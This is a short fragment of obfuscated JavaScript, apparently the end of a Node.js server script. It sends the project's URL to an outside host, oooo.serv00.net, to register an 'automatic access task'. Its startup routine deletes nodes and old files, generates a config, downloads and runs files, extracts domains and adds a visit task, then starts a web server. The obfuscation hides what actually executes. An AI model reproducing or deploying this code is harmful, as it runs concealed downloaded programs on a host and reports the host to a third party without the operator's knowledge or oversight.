axios[_0x1d1763(0x15f)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1d1763(0x185)}});return console[_0x1d1763(0x178)]('automatic\x20access\x20task\x20added\x20successfully'),_0x3e0d5d;}catch(_0x389520){return console['error'](_0x1d1763(0x1a0)+_0x389520[_0x1d1763(0x199)]),null;}}async function startserver(){const _0x393e1d=_0x1b6d0a;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x596a8c){console['error'](_0x393e1d(0x1ae),_0x596a8c);}}startserver()['catch'](_0x1b0907=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x1b0907);}),app[_0x1b6d0a(0x191)](PORT,()=>console[_0x1b6d0a(0x178)](_0x1b6d0a(0x1c1)+PORT+'!'));
